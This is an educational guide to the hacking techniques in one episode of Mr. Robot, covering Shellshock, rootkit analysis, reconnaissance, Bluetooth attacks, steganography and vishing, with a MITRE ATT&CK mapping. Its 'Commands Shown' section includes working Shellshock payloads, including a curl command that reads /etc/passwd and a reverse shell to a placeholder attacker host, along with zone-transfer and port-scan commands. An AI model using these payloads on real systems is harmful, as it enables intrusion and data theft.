# Episode 2: eps1.1_ones-and-zer0es.mpeg

## Overview

Elliot continues his investigation into the rootkit discovered on E Corp's servers while navigating his dual life as an Allsafe employee and underground hacker. The episode introduces the Shellshock vulnerability, deepens the analysis of the E Corp rootkit's command-and-control infrastructure, and begins reconnaissance on Steel Mountain, E Corp's critical data storage facility. A notable scene involves Bluetooth hacking of Tyrell Wellick's phone, and the use of DeepSound steganography for hiding data in audio files is introduced.

---

## Hacks & Techniques

### 1. Shellshock (CVE-2014-6271) Vulnerability References

The episode references the Shellshock vulnerability, a critical flaw in GNU Bash discovered in September 2014 that affected millions of systems worldwide. Shellshock allows remote code execution by exploiting how Bash processes environment variables containing function definitions.

**How Shellshock works:**

Bash allowed trailing commands after function definitions stored in environment variables to be executed when a new Bash shell was spawned. An attacker could inject arbitrary commands after a specially crafted function definition.

**Vulnerable pattern:**

```bash
# The malicious environment variable
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

When Bash processes the environment variable `x`, it parses the function definition `() { :;};` but then continues to execute the trailing command `echo vulnerable`. This becomes dangerous when combined with services that pass user input as environment variables, such as:

- **CGI web servers**: Apache mod_cgi passes HTTP headers (User-Agent, Referer, Cookie) as environment variables to CGI scripts
- **DHCP clients**: Process options from DHCP servers as environment variables
- **SSH**: The `ForceCommand` feature passes the original command as an environment variable
- **OpenVPN**: Passes configuration options to scripts via environment variables

**Attack vectors in the show's context:**

- Web servers running CGI scripts could be exploited remotely via crafted HTTP headers
- Internal systems running vulnerable Bash versions could be compromised through lateral movement
- The vulnerability's ubiquity (Bash is present on virtually every Unix/Linux system) made it a prime vector for mass exploitation

**Impact scope:**

CVE-2014-6271 received a CVSS score of 10.0 (Critical). It was followed by several related CVEs (CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187) as additional bypass vectors were discovered.

### 2. E Corp Server Rootkit Continued Analysis

Elliot deepens his investigation of the rootkit discovered in Episode 1. This involves forensic techniques to understand the rootkit's capabilities, persistence mechanisms, and communication patterns.

**Analysis techniques:**

- **Strings analysis**: Extracting human-readable strings from the binary to identify hardcoded IP addresses, domain names, file paths, encryption keys, or debugging messages left by the developer.
- **Network connection analysis**: Using `netstat` and packet capture tools to identify outbound connections to C2 (command and control) servers, including unusual ports, protocols, and connection timing patterns.
- **Log analysis**: Examining system logs, authentication logs, and application logs for indicators of compromise (IOCs), though sophisticated rootkits often tamper with logging mechanisms.
- **File integrity checking**: Comparing system binaries against known-good hashes to identify modified or replaced files.
- **Memory forensics**: Examining running processes in memory to identify injected code, hooked system calls, or hidden processes that disk-based analysis might miss.

**Rootkit C2 communication patterns observed:**

- Periodic beaconing to external IP addresses at regular intervals
- DNS-based communication channels (DNS tunneling) for data exfiltration
- Encrypted payloads to evade deep packet inspection
- Domain generation algorithms (DGAs) to rotate C2 infrastructure

### 3. Steel Mountain Data Center Reconnaissance

fsociety begins planning their attack on Steel Mountain, E Corp's physical data storage facility that houses critical backup tapes. This phase involves extensive reconnaissance gathering.

**Reconnaissance techniques:**

- **Physical site analysis**: Satellite imagery (Google Earth), building blueprints from public records, identifying entry/exit points, loading docks, and security checkpoint locations
- **Employee OSINT**: LinkedIn profiles of Steel Mountain employees to understand organizational structure, identify potential social engineering targets, and map access privileges
- **Network footprinting**: DNS enumeration, WHOIS lookups, subdomain discovery, and port scanning of publicly facing infrastructure associated with the facility
- **Public records**: Building permits, environmental assessments, fire safety reports, and other documents that reveal physical infrastructure details
- **Job postings analysis**: Technical job listings that reveal technology stack, security tools in use, and operational procedures

### 4. Bluetooth Hacking of Tyrell Wellick's Phone

In a notable scene, Bluetooth vulnerabilities are exploited to gain access to Tyrell Wellick's phone. This involves scanning for discoverable Bluetooth devices and exploiting protocol weaknesses.

**Bluetooth attack methodology:**

1. **Discovery phase**: Scanning for Bluetooth devices in range (up to ~100 meters with Class 1 adapters)
2. **Enumeration**: Identifying device type, services, and Bluetooth profile support
3. **Exploitation**: Leveraging protocol vulnerabilities to gain unauthorized access

**Bluetooth attack types:**

| Attack | Description |
|--------|-------------|
| Bluejacking | Sending unsolicited messages via OBEX push |
| Bluesnarfing | Unauthorized access to data (contacts, calendar, SMS) via OBEX |
| Bluebugging | Full device control including calls, SMS, and data access |
| KNOB Attack | Key Negotiation of Bluetooth - forcing weak encryption keys |
| BlueBorne | Remote code execution without pairing (CVE-2017-0781 et al.) |

**Tools used:**

- **btscanner**: A Bluetooth device discovery and information gathering tool. Extracts device name, class, manufacturer, clock offset, and supported services without requiring authentication or pairing.
- **hcitool**: A Linux command-line utility for configuring Bluetooth connections and performing device scans. Part of the BlueZ Bluetooth protocol stack.

### 5. DeepSound Steganography

The episode introduces DeepSound, a steganography tool used to hide data within audio files. Steganography is the practice of concealing information within innocuous-looking carrier files so that the existence of the hidden data is not apparent.

**How DeepSound works:**

- Embeds encrypted data into the least significant bits (LSBs) of audio samples in WAV, FLAC, WMA, or APE files
- The modifications to the audio are imperceptible to human hearing because changes to the least significant bits produce negligible amplitude differences
- Supports AES-256 encryption of the embedded data before insertion
- The resulting audio file plays normally in any media player with no audible artifacts
- Extraction requires the DeepSound application and the correct password

**Steganography vs. cryptography:**

- **Cryptography** transforms data into an unreadable form; an adversary knows encrypted data exists but cannot read it
- **Steganography** hides the very existence of the data; an adversary does not know there is hidden information
- Combined, they provide both concealment and protection: even if the steganographic carrier is discovered, the encrypted payload remains unreadable

**Detection (steganalysis):**

- Statistical analysis of LSB distributions (chi-square analysis, RS analysis)
- Comparison with original unmodified files (if available)
- Machine learning classifiers trained on stego vs. clean files
- Audio-specific analysis of spectral anomalies

### 6. Social Engineering via Phone (Vishing)

Characters in the episode use voice phishing (vishing) techniques to extract information or manipulate targets over the phone.

**Vishing techniques depicted:**

- **Pretexting**: Creating a fabricated scenario to justify the request for information (e.g., pretending to be IT support, a vendor, or management)
- **Authority impersonation**: Claiming to be someone in a position of power to compel compliance
- **Urgency creation**: Manufacturing time pressure to prevent the target from thinking critically or verifying the caller's identity
- **Information elicitation**: Asking indirect questions that lead the target to reveal sensitive information without realizing its significance

**Why vishing remains effective:**

- Phone calls create a sense of immediacy and personal connection that emails lack
- Caller ID can be spoofed trivially using VoIP services
- People are culturally conditioned to be helpful and responsive on the phone
- Verification procedures are often bypassed under perceived time pressure

---

## Tools Used

| Tool | Purpose | Category |
|------|---------|----------|
| btscanner | Bluetooth device discovery and enumeration | Wireless Hacking |
| hcitool | Bluetooth device scanning and connection management | Wireless Hacking |
| DeepSound | Audio steganography (hiding data in sound files) | Steganography |
| strings | Extract readable text from binary files | Forensics |
| netstat | Display network connections and listening ports | Network Analysis |
| Wireshark | Packet capture and protocol analysis (implied) | Network Analysis |
| Nmap | Network scanning for reconnaissance (implied) | Reconnaissance |
| Google Earth | Satellite imagery for physical reconnaissance | OSINT |

---

## Commands Shown

### Rootkit analysis commands
```bash
# Extract readable strings from the suspicious rootkit binary
strings -a rootkit.dat | less

# Search for IP addresses in the binary
strings rootkit.dat | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}'

# Search for URLs or domain names
strings rootkit.dat | grep -iE '(https?://|www\.|\.com|\.net|\.org)'

# Monitor network connections for C2 beaconing
netstat -tulnp | grep ESTABLISHED

# Watch for new outbound connections in real time
watch -n 5 'netstat -an | grep ESTABLISHED | awk "{print \$5}" | cut -d: -f1 | sort | uniq -c | sort -rn'

# Check system logs for suspicious entries
grep -i "error\|warning\|fail\|denied" /var/log/syslog | tail -100

# Review authentication logs
grep -i "accepted\|failed\|invalid" /var/log/auth.log | tail -50
```

### Bluetooth scanning commands
```bash
# Scan for discoverable Bluetooth devices in range
hcitool scan

# Extended inquiry scan for more device details
hcitool inq

# Get device name from Bluetooth address
hcitool name AA:BB:CC:DD:EE:FF

# Detailed device information
hcitool info AA:BB:CC:DD:EE:FF

# Launch btscanner for interactive Bluetooth reconnaissance
btscanner

# List available Bluetooth services on a device
sdptool browse AA:BB:CC:DD:EE:FF
```

### Shellshock exploitation examples
```bash
# Test for Shellshock vulnerability locally
env x='() { :;}; echo VULNERABLE' bash -c "echo test"

# Exploit via CGI - crafted HTTP request with malicious User-Agent
curl -A "() { :;}; /bin/bash -c 'cat /etc/passwd'" http://target/cgi-bin/vuln.cgi

# Reverse shell via Shellshock
curl -A "() { :;}; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1" http://target/cgi-bin/vuln.cgi

# Shellshock via DHCP client attack
# Malicious DHCP server sends option 114 with payload:
# () { ignored;}; /bin/bash -c 'commands_here'
```

### Network reconnaissance for Steel Mountain
```bash
# DNS enumeration
dig steelmountain.ecorp.com ANY
dig axfr steelmountain.ecorp.com @ns1.ecorp.com

# Subdomain discovery
nmap --script dns-brute steelmountain.ecorp.com

# WHOIS lookup
whois ecorp.com

# Port scanning of public-facing infrastructure
nmap -sS -sV -O -p- --script=default target_ip
```

---

## Real-World Parallels

### Shellshock (CVE-2014-6271)
Shellshock was discovered by Stephane Chazelas in September 2014 and immediately became one of the most critical vulnerabilities ever found. Within hours of public disclosure, botnets were scanning the entire IPv4 address space for vulnerable systems. The vulnerability existed in Bash for approximately 25 years before discovery. Notable exploitation campaigns included the "Bash bug" botnet that targeted QNAP network-attached storage devices and attacks against Yahoo servers reportedly attributed to Romanian hackers. The US Department of Homeland Security rated it 10/10 for severity.

### Bluetooth Security Vulnerabilities
Bluetooth attacks have a rich history in security research. The original Bluesnarfing vulnerability (2003) allowed attackers to access phone contacts, calendars, and messages from Nokia and Sony Ericsson phones. In 2017, the BlueBorne vulnerabilities discovered by Armis Labs affected an estimated 5.3 billion devices across Android, iOS, Windows, and Linux, allowing remote code execution without any user interaction. The 2019 KNOB (Key Negotiation of Bluetooth) attack showed that even paired connections could be compromised by forcing the use of weak encryption keys.

### Steganography in Real Operations
Steganography has been used in documented espionage cases. In 2010, the FBI arrested a Russian spy ring (the Illegals Program) that embedded encrypted messages in images posted on publicly accessible websites. The group used custom steganography software to hide communications in innocuous photographs. Steganography has also been used by malware authors; the Duqu 2.0 malware (attributed to Israeli intelligence) transmitted stolen data hidden in JPEG image files.

### Social Engineering and Vishing
Kevin Mitnick, arguably the most famous social engineer in hacking history, extensively documented vishing techniques in his book "The Art of Deception" (2002). Modern vishing attacks have become industrialized, with campaigns targeting banks, utilities, and government agencies. The 2020 Twitter Bitcoin scam was initiated through vishing calls to Twitter employees, ultimately compromising high-profile accounts including those of Barack Obama, Jeff Bezos, and Elon Musk.

---

## Tool Links

- **DeepSound**: http://jpinsoft.net/deepsound/
- **Nmap**: https://nmap.org/
- **Wireshark**: https://www.wireshark.org/
- **Shellshock (CVE-2014-6271)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
- **Tor**: https://www.torproject.org/
- **Maltego** (OSINT, implied): https://www.maltego.com/
- **Shodan** (reconnaissance, implied): https://www.shodan.io/

---

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Shellshock vulnerability exploitation | T1190 | Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| Shellshock remote code execution via CGI | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Rootkit C2 beaconing analysis | T1071 | Application Layer Protocol | https://attack.mitre.org/techniques/T1071/ |
| Rootkit persistence | T1014 | Rootkit | https://attack.mitre.org/techniques/T1014/ |
| DNS-based C2 tunneling | T1572 | Protocol Tunneling | https://attack.mitre.org/techniques/T1572/ |
| Domain Generation Algorithms | T1568 | Dynamic Resolution | https://attack.mitre.org/techniques/T1568/ |
| Steel Mountain network reconnaissance | T1595 | Active Scanning | https://attack.mitre.org/techniques/T1595/ |
| Employee OSINT for social engineering | T1589 | Gather Victim Identity Information | https://attack.mitre.org/techniques/T1589/ |
| Bluetooth device exploitation | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |
| DeepSound steganography | T1027 | Obfuscated Files or Information | https://attack.mitre.org/techniques/T1027/ |
| Vishing / social engineering via phone | T1598 | Phishing for Information | https://attack.mitre.org/techniques/T1598/ |
| Gathering victim host information | T1592 | Gather Victim Host Information | https://attack.mitre.org/techniques/T1592/ |

---

## References and Further Reading

- **CVE-2014-6271 (Shellshock)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
- **CVE-2014-7169 (Shellshock follow-up)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
- **CVE-2017-0781 (BlueBorne)**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0781
- **Armis Labs BlueBorne Research**: https://www.armis.com/research/blueborne/
- **KNOB Attack (2019)**: https://knobattack.com/
- **FBI Russian Spy Ring Steganography Case (2010)**: https://www.fbi.gov/news/stories/operation-ghost-stories-inside-the-russian-spy-case
- **Kevin Mitnick - The Art of Deception**: https://www.mitnicksecurity.com/
- **2020 Twitter Bitcoin Scam via Vishing**: https://blog.twitter.com/en_us/topics/company/2020/an-update-on-our-security-incident
- **SANS - Steganography Analysis and Detection**: https://www.sans.org/white-papers/
- **Black Hat - Bluetooth Security Research**: https://www.blackhat.com/

---

## Search Tags

```
tags: [Shellshock, CVE-2014-6271, Bluetooth, Bluesnarfing, DeepSound, steganography, rootkit, C2, DNS tunneling, DGA, reconnaissance, OSINT, vishing, social engineering, btscanner, hcitool, Nmap, Wireshark]
season: 1
episode: 2
mitre: [T1190, T1059, T1071, T1014, T1572, T1568, T1595, T1589, T1200, T1027, T1598, T1592]
```